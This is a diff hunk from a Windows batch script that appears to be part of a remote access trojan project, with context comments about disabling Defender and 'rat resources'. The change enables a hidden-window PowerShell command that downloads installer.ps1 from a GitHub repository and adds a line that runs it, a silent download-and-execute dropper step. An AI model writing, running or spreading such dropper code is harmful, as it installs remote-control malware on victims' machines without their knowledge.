@@ -36,8 +36,8 @@ rem disable defender
  
 REM rat resources  
 
-@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/installer.ps1 -OutFile installer.ps1"
-@REM powershell  Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/installer.ps1 -OutFile installer.ps1"
+ powershell  -c  "./installer.ps1"
 
 rem this is for the testing to update the repo
 
